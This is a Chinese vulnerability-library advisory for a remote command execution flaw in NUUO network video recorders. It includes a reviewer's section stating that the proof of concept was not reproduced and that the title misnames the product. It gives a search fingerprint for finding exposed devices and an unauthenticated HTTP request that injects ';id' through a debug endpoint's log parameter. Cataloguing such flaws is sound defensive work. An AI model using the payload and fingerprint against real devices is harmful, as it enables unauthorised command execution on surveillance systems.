---
source: "wy876 漏洞文库"
id: "vw-c4b1089483888f542848b526"
entity_id: "ve-c4b1089483888f542848b526"
schema_version: "1"
title: "NUUO摄像头存在远程命令执行漏洞"
product: "NUUO网络录像机，标题误称摄像头"
record_type: "advisory"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "无cookie请求，型号/固件不明"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E6%99%BA%E8%83%BD%E8%AE%BE%E5%A4%87/NUUO/NUUO%E6%91%84%E5%83%8F%E5%A4%B4%E5%AD%98%E5%9C%A8%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/qa3vprl34sg1ay3x"
source_status: "recorded"
previous_fofa_unverified: "web.title="
hunter: "web.title=\"Network Video Recorder Login\""
---

# NUUO摄像头存在远程命令执行漏洞

> 指纹字段校订（2026-10-04）：本文原归档明确标为 Hunter 的完整表达式已记入 `hunter`；原残缺 `fofa_unverified` 值逐字保存在 `previous_fofa_unverified`。后文关于该字段残缺的旧说明只描述校订前状态。查询用于产品检索，不证明资产受影响。

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：NUUO网络录像机，标题误称摄像头
- 本文讨论：__debugging_center_utils___.php log命令注入
- 版本、权限与配置前提：无cookie请求，型号/固件不明
- 资料类型：调试接口命令执行摘要；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- NVR与摄像头产品类型混淆；无输出或原始来源/补丁
- fofa实际Hunter残缺字段，通用NVR标题指纹过宽
- 已落实的文本修订：HTTP 报文围栏改为 http；残缺指纹退出可执行索引并保留原值。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 执行文中载荷可能以目标进程权限启动命令或加载代码；权限受认证角色、操作系统账户及依赖版本约束，不能把 root/200 等通用字符串当成功证据

### 待核与来源

- 真实文件名、型号/认证及修复待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


# 一、漏洞简介
NUUO摄像头是中国台湾NUUO公司旗下的一款网络视频记录器，该设备存在远程命令执行漏洞，攻击者可利用该漏洞执行任意命令，进而获取服务器的权限。

# 二、影响版本
+ NUUO摄像头

# 三、资产测绘
+ hunter`web.title="Network Video Recorder Login"`
+ 特征


# 四、漏洞复现
```http
GET /__debugging_center_utils___.php?log=;id HTTP/1.1
Host: xx.xx.xx.xx
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept: */*
Connection: Keep-Alive
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/qa3vprl34sg1ay3x>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
